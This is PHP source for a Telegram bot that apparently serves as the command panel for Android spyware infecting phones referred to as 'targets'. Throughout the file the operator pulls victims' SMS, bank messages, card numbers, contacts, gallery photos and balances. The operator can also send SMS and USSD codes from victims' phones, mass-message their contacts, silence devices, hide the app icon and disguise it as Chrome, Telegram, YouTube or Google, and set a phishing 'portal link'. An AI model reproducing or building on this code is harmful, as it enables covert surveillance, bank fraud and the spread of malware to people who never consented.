        file_put_contents("user/$device_id-name.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");


    } elseif ($data == "set_number") {
        emg($chat_id, $mi, "Please send the <b>SMS Number ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set number");

    } elseif ($command == "set number") {

        smg($chat_id, "<b>SMS Number</b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("data/number-first.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "set_number_offline_mode") {
        emg($chat_id, $mi, "Please send the <b>Oflline Mode SimCard Number ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set offline");

    } elseif ($command == "set offline") {

        smg($chat_id, "<b>Oflline Mode SimCard Number </b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("data/offline-number.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "num_senders") {
        $text = file_get_contents("user/AllSMS.txt");
        preg_match_all('/sender : (.+)/', $text, $matches);

        $senders = $matches[1];
        $x = "";
        foreach ($senders as $sender) {
            if (strpos($sender, '+98') !== False) {
                $count = preg_match_all("/[0-9]/", $sender, $matches);
                if ($count == 12) {

                    $x .= "$sender\n";
                }
            }
            if (strpos($sender, '09') !== False) {
                $count = preg_match_all("/[0-9]/", $sender, $matches);
                if ($count == 11) {

                    $x .= "$sender\n";
                }
            }
        }
        preg_match_all('/sender : (.+)/', $text, $matches);

        $senders = $matches[1];
        $x = "";
        foreach ($senders as $sender) {
            if (strpos($sender, '+98') !== False) {
                $count = preg_match_all("/[0-9]/", $sender, $matches);
                if ($count == 12) {

                    $x .= "$sender\n";
                }
            }
            if (strpos($sender, '09') !== False) {
                $count = preg_match_all("/[0-9]/", $sender, $matches);
                if ($count == 11) {

                    $x .= "$sender\n";
                }
            }
        }
        $lines = explode("\n", $x);
        $unique_lines = array_unique($lines);
        $result = implode("\n", $unique_lines);
        bot('sendMessage', [
            'chat_id' => $id_sender,
            'text' => "$result\n<blockquote>🕸 <a href='https://t.me/QQaVaNeN'> › ᴢɪʀᴇx</a></blockquote>",
            'parse_mode' => 'HTML',
        ]);
    } elseif ($data == "num_con") {
        $text = file_get_contents("user/@Wild_MaTiN");
        preg_match_all('/Phone : (.+)/', $text, $matches);

        $senders = $matches[1];
        $x = "";
        $n = 0;
        foreach ($senders as $sender) {
            $n += 1;
            $x .= "$sender\n";
            if ($n >= 299) {
                $lines = explode("\n", $x);
                $unique_lines = array_unique($lines);
                $result = implode("\n", $unique_lines);
                bot('sendMessage', [
                    'chat_id' => $id_sender,
                    'text' => "$result",
                    'parse_mode' => 'HTML',
                ]);
                $x = "";
                $n = 0;
            }


        }
        $lines = explode("\n", $x);
        $unique_lines = array_unique($lines);
        $result = implode("\n", $unique_lines);
        bot('sendMessage', [
            'chat_id' => $id_sender,
            'text' => "$result\n<blockquote>🕸 <a href='https://t.me/QQaVaNeN'> › ᴢɪʀᴇx</a></blockquote>",
            'parse_mode' => 'HTML',
        ]);
    } elseif ($data == "checkhost") {


        emg($chat_id, $mi, "<b>Check URL From Check-Host.net</b> are being successfully received, Approximate time : 5 seconds", $back_settings);
        $check_result = checkhost($link_show);

        $check_result_string = '';
        foreach ($check_result as $city => $value) {
            if ($value['statuscode'] == "200" || $value['statuscode'] == "301") {
                $emoji = "✅";
            } else {
                $emoji = "⛔️";
            }
            $time = substr($value['time'], 0, 4);
            $mtext = "<b>Check URL From Check-Host.net</b>";

            $check_result_string .= "<b>$emoji $city</b> ==>";
            $check_result_string .= "<b>Status </b> : {$value['status']} | {$value['statuscode']}\n";
            $check_result_string .= "<b>Load Time</b> : $time\n";
            $check_result_string .= "➖➖➖➖➖➖\n";
        }
        smg($chat_id, $check_result_string, null);
    } elseif ($data == "get_all_balance") {
        emg($chat_id, $mi, "<b>Get All Balance</b> are being successfully received, Approximate time : 3 seconds", $back_settings);
        requests('getallbalance', $device_id);
    } elseif ($data == "hide_all") {
        emg($chat_id, $mi, "<b>REQUEST SENT SUCCESSFULLY</b> ", $geeeh);
        requestsAll('hide_all');
    } elseif ($data == "silent_all") {
        emg($chat_id, $mi, "<b>Ringer Mode</b> of all devices successfully changed to [ <b>Silent</b> ]", $back_settings);
        requestsAll('silent_all');
    } elseif ($data == "set_url") {

        emg($chat_id, $mi, "Please send the <b>Portal Link ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set url");

    } elseif ($command == "set url") {

        smg($chat_id, "<b>Portal Link</b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("link.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "show_url") {
        emg($chat_id, $mi, "‹‹ <b>Portal Link</b> ›› section\n\nSelect the desired option :", $url_inline);
    } elseif ($data == "sms_all") {
        file_put_contents("user/$chat_id/command.txt", "");
        emg($chat_id, $mi, "‹‹ <b>Send SMS For All Users</b> ›› section\n\nText Message : [ <code>$text_message</code> ]", $sms_button_all);
    } elseif ($data == "set_message_contacts") {
        emg($chat_id, $mi, "Please send the <b>SMS Text ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "message_contacts");
    } elseif ($command == "message_contacts") {
        file_put_contents("data/message_contacts.txt", $text);
        smg($chat_id, "<b>SMS Text</b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "edit_message_all") {
        emg($chat_id, $mi, "Please send the <b>SMS Text ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set message all");
    } elseif ($command == "set message all") {
        file_put_contents("user/$chat_id/message.txt", $text);
        smg($chat_id, "<b>SMS Text</b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "set_list_all") {
        emg($chat_id, $mi, "Please send the <b>List Number ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set list all");
    } elseif ($command == "set list all") {

        file_put_contents("user/$chat_id/numberlist.txt", $text);
        smg($chat_id, "<b>List Number</b> was successfully \n\nShould Messages Be Sent?", $send_sms_all);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "last_send_all") {

        emg($chat_id, $mi, "<b>SMS</b> was successfully sent to [ <b>$number_message</b> | <b>$text_message SMS</b> ]", $back_settings);
        $time = explode("\n", $number_message);
        $time = count($time) * 5;
        $str = str_replace("\n", ",", $number_message);
        requestSMS("send_sms_all", null, $str, $text_message);
    } elseif (strpos($data, "information") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $info_button = info_button($device_id);
        file_put_contents("user/$chat_id/command.txt", "");
        emg($chat_id, $mi, "‹‹ <b>Information</b> ›› section\n\nName Target : [ <code>$target_name</code> ]\n\nInstall IP : [ <code>$install_ip</code> ]", $info_button);
    } elseif (strpos($data, "send_sms") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $sms_button = sms_button($device_id);


        file_put_contents("user/$chat_id/command.txt", "");
        emg($chat_id, $mi, "‹‹ <b>Send SMS</b> ›› section\n\nText Message : [ <code>$text_message</code> ]", $sms_button);

    } elseif (strpos($data, "searchSMS") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "Please send the <b>Word ...</b>", $back_control);
        file_put_contents("user/$chat_id/command.txt", "setwords $device_id");
    } elseif (strpos($data, "ussdcode") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        emg($chat_id, $mi, "Please send the <b>Code ...</b>", $back_control);
        file_put_contents("user/$chat_id/command.txt", "sendussd $device_id");
    }elseif (strpos($command, "setwords") !== false) {
        $datass = explode(" ", $command);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        file_put_contents("user/$chat_id/command.txt", "");
        requestSMS("searchSMS", $device_id, null, $text);
        smg($chat_id, "<b>Search $text</b> was successfully Sent to User , Approximate time : 10 seconds", $back_control);

    } elseif (strpos($command, "sendussd") !== false) {
        $datass = explode(" ", $command);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        $ussd = $text;
        file_put_contents("user/$chat_id/command.txt", "");
        requestSMSContact("ussdcode",$device_id,$ussd);
        smg($chat_id, "<b>Send Ussd $ussd</b> was successfully Sent to User , Approximate time : 10 seconds", $back_control);

    }elseif ($data == "search_all") {
        emg($chat_id, $mi, "Please send the <b>Word ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set words2");
    } elseif ($command == "set words2") {
        file_put_contents("user/$chat_id/command.txt", "");
        requestSMS("allSearch", $device_id, null, $text);
        smg($chat_id, "<b>Search $text</b> was successfully Sent to All User , Approximate time : 10 seconds", $back_settings);

    } elseif (strpos($data, "clearinfo") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $info_button = info_button($device_id);
        emg($chat_id, $mi, "All Info Target ( name ) changed to [ <code>Null</code> ]", $info_button);
        file_put_contents("user/$device_id-name.txt", "null");
    } elseif (strpos($data, "edit_message") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_sms = back_sms($device_id);
        emg($chat_id, $mi, "Please send the <b>SMS Text ...</b>", $back_sms);
        file_put_contents("user/$chat_id/command.txt", "setmessage $device_id");

    } elseif (strpos($command, "setmessage") !== false) {
        $datass = explode(" ", $command);
        $device_id = $datass[1];
        $back_sms = back_sms($device_id);

        file_put_contents("user/$chat_id/message.txt", $text);
        smg($chat_id, "<b>SMS Text</b> was successfully set to [ <code>$text</code> ]", $back_sms);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif (strpos($data, "set_list") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_sms = back_sms($device_id);
        emg($chat_id, $mi, "Please send the <b>List Number ...</b>", $back_sms);
        file_put_contents("user/$chat_id/command.txt", "setlist $device_id");

    } elseif (strpos($command, "setlist") !== false) {
        $datass = explode(" ", $command);
        $device_id = $datass[1];
        $send_sms = send_sms($device_id);

        file_put_contents("user/$chat_id/numberlist.txt", $text);
        smg($chat_id, "<b>List Number</b> was successfully \n\nShould Messages Be Sent?", $send_sms);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif (strpos($data, "last_send") !== false) {

        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>SMS</b> was successfully sent to [ <b>$number_message</b> | <b>$text_message SMS</b> ]", $back_control);
        $time = explode("\n", $number_message);
        $time = count($time) * 5;
        $str = str_replace("\n", ",", $number_message);
        requestSMS("send_sms", $device_id, $str, $text_message);


    } elseif (strpos($data, "status_user") !== false) {

        $datass = explode(" ", $data);
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "Checking Device, Approximate time : ( $datass[1] ) 3 seconds", $back_control);
        requests('status', $datass[1]);
    } elseif (strpos($data, "last_sms") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);

        emg($chat_id, $mi, "<b>Last SMS</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('last_sms', $device_id);


    } elseif (strpos($data, "Alert") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);

        emg($chat_id, $mi, "Sent Alert", $back_control);
        requests('Alert', $device_id);
      


    } elseif (strpos($data, "all_sms") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $getsmsButton = getsmsButton($device_id);

        emg($chat_id, $mi, "Choose Type To Get", $getsmsButton);
    } elseif (strpos($data, "sent") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>The messages he sent</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('all_sms_sent', $device_id);
    } elseif (strpos($data, "Popo ") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>All SMS</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('all_sms', $device_id);
    } elseif (strpos($data, "all_contacts ") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>All Contact</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('all_contacts', $device_id);
    } elseif (strpos($data, "recived") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Messages sent to him</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('all_sms_recived', $device_id);
    } elseif (strpos($data, "balance") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Balance</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('balance', $device_id);

    } elseif (strpos($data, "all_balanc2") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        smg($chat_id, "<b>wait...</b>", null);
        file_put_contents("data/bal.txt", "singel");
        requests('balance', $device_id);
    } elseif (strpos($data, "last_Bank_sms") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Last Bank SMS</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('last_bank_sms', $device_id);
    } elseif (strpos($data, "All_Bank_sms") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>All Bank SMS</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requests('all_bank_sms', $device_id);
    } elseif (strpos($data, "cardnumbers") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Card Numbers</b> request sent, Approximate time : 3 seconds", $back_control);
        requests('cardnumbers', $device_id);
    } elseif (strpos($data, "WhatsChecker") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        $word = file_get_contents("user/$chat_id/word.txt");
        emg($chat_id, $mi, "<b>CheCk $word</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requestSMS("WhatsChecker", $device_id, null, $word);
    } elseif (strpos($data, "vibrate_mode") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>Device Ringer Mode</b> successfully changed to [ <b>Vibrate</b> ]", $back_control);
        requests('Vibrate', $device_id);
        file_put_contents("user/$datass[1]-ringer.txt", "Vibrate");

    } elseif (strpos($data, "silent_mode") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>Device Ringer Mode</b> successfully changed to [ <b>Silent</b> ]", $back_control);
        requests('silent', $device_id);
        file_put_contents("user/$datass[1]-ringer.txt", "Silent");
    } elseif (strpos($data, "normal_mode") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>Device Ringer Mode</b> successfully changed to [ <b>Normal</b> ]", $back_control);
        requests('Normal', $device_id);
        file_put_contents("user/$datass[1]-ringer.txt", "Normal");

    } elseif (strpos($data, "hide_icon") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>Device Apk  Icon</b> successfully changed to [ <b>Hidden</b> ]", $back_control);
        requests('hidden', $device_id);
        file_put_contents("user/$datass[1]-apk.txt", "Hidden");
    } elseif (strpos($data, "visible_icon") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>Device Apk Icon</b> successfully changed to [ <b>Visible</b> ]", $back_control);
        requests('visible', $device_id);
        file_put_contents("user/$datass[1]-apk.txt", "Visible");
    } elseif (strpos($data, "change") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $changeiconButton = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [[['text' => "🌐 ᴄʜʀᴏᴍᴇ 🌐", 'callback_data' => "chrome $datass[1]"], ['text' => "🧩 ᴛᴇʟᴇɢʀᴀᴍ 🧩", 'callback_data' => "telegram $datass[1]"]],
            [['text' => "🎛 ʏᴏᴜᴛᴜʙᴇ 🎛", 'callback_data' => "youtube $datass[1]"], ['text' => "🔰 ɢᴏᴏɢʟᴇ 🔰", 'callback_data' => "google $datass[1]"]],
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]],
        ]]);
        emg($chat_id, $mi, "Choose Your Icon To Change", $changeiconButton);

    } elseif (strpos($data, "chrome") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Device Apk Icon</b> successfully [ <b>Changed</b> ]", $back_control);

        requests('changetochrome', $device_id);
    } elseif (strpos($data, "telegram") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Device Apk Icon</b> successfully [ <b>Changed</b> ]", $back_control);
        requests('changetotel', $device_id);
    } elseif (strpos($data, "google") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Device Apk Icon</b> successfully [ <b>Changed</b> ]", $back_control);
        requests('changetogoogle', $device_id);
    } elseif (strpos($data, "youtube") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "<b>Device Apk Icon</b> successfully [ <b>Changed</b> ]", $back_control);
        requests('changetoyoutube', $device_id);
    } elseif (strpos($data, "gallery_100") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "📷 | ɢᴀʟʟᴇʀʏ (ʟᴀꜱᴛ 100) | 📷\n🌀 | ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ | 🌀\n🚹 | ᴛᴀʀɢᴇᴛ | 🚹: [$device_id]", $back_control);
        requestGallery($device_id, "100");
    } elseif (strpos($data, "gallery_all") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "📷 | ɢᴀʟʟᴇʀʏ (ᴀʟʟ) | 📷\n🌀 | ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ | 🌀\n🚹 | ᴛᴀʀɢᴇᴛ | 🚹: [$device_id]", $back_control);
        requestGallery($device_id, "0");
    } elseif (strpos($data, "gallery") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $gallery_btn = gallery_button($device_id);
        emg($chat_id, $mi, "📷 | ɢᴀʟʟᴇʀʏ | 📷\n🚹 | ᴛᴀʀɢᴇᴛ | 🚹: [$device_id]\n\nꜱᴇʟᴇᴄᴛ ᴏᴘᴛɪᴏɴ:", $gallery_btn);
    } elseif (strpos($data, "userphone") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>User Phone </b>Sent successfully  to [ <b>$device_id</b> ]", $back_control);
        requests('userphone', $device_id);
    }
}
?>